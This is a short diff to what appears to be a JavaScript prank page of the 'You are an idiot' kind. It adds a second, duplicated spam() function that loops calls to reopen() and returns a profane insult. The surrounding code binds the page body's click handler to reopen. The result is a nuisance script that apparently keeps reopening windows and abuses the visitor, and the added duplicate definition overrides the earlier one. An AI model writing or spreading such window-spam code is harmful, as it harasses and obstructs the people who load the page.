@@ -20,6 +20,11 @@ function spam() {
     reopen();
   }
   return "You are an idiot!";
+}function spam() {
+  for (var i = 0; i < 10; i++) {
+    reopen();
+  }
+  return "You are an Idiot motherfucker!!!! !";
 }
 function init() {
   document.body.onclick = reopen;
